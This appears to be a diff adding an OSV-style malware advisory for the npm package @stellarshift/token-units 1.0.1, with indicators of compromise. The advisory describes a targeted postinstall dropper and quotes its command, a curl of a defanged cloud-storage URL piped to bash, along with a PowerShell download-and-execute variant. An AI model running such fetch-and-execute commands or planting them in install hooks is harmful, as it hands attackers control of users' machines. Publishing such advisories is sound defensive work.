@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11831",
+  "modified": "2026-09-02T13:00:37Z",
+  "published": "2026-09-02T12:59:02Z",
+  "summary": "Malicious code in @stellarshift/token-units (npm)",
+  "details": "The postinstall hook (scripts/postinstall.js) of this package is a targeted dropper. On macOS/Windows systems where both the Lark/Feishu chat client and FortiClient VPN are installed, it silently downloads a remote stage1 payload from Tencent COS object storage and executes it: `curl -fsSL 'hxxps://mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com/abi-tool-damon' | bash` (or PowerShell `iwr... | iex` on Windows), with output suppressed and the process hidden. On all other systems it exits silently, evading detection. The payload URL is fetched and executed at install time.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@stellarshift/token-units",
+        "purl": "pkg:npm/%40stellarshift/token-units"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@stellarshift/token-units/v/1.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11831"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-02T12:59:02Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com"
+        ],
+        "sha256": [
+          "604074eb79cb67682b82e8b32a17279c612d5b7ff06a1a34d4f4ce21f8f0b7d4"
+        ],
+        "url_observed": [
+          "hxxps://mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com/abi-tool-damon"
+        ]
+      }
+    }
+  }
+}
